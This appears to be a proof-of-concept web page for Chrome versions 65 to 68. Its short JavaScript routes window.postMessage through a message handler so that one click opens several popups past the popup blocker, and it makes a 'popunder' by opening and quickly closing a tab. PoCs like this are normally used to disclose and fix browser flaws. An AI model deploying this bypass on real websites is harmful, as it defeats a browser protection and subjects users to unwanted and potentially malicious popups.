<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style></style></head><body>Chrome Version 65.0.3325.181 (Official Build) (64-bit) (mac/windows) <br>
Chrome Canary Version 68.0.3397.0 (Official Build) canary (64-bit) (mac)<br>
Chromium Version 68.0.3397.0 (Developer Build) (64-bit) (mac)<br>
<ul>
<li><a href="https://liveoverflow.com/poc/popunder68.html#" id="popunder">popunder</a></li>
<li><a href="https://liveoverflow.com/poc/popunder68.html#" id="popupblocker">bypass blocker</a></li>
</ul>
<script>

    window.popunder.addEventListener('mousedown', function() {
        // should create a popunder
        window.postMessage(1, document.location)
        window.postMessage(2, document.location)
    });

    window.popupblocker.addEventListener('mousedown', function() {
        // should open 10 popups
        for(var i=0; i<10; i++){
            window.postMessage(1, document.location);
        }
    });

    window.addEventListener("message", function(a) {
        if(a.data==1) {
            // open a new popup
            window.open("about:blank","_blank", "width=638,height=750,left=642,top=22,status=0,location=0,toolbar=0,menubar=0,resizable=1,scrollbars=1");   
        } 
        if(a.data==2) {
            // open a new tab and close it again. places focus back on original frame
            tab = window.open("about:blank","_blank");   
            setTimeout(function() {
                tab.close();
            },100)
        } 
    });

</script>

</body></html>
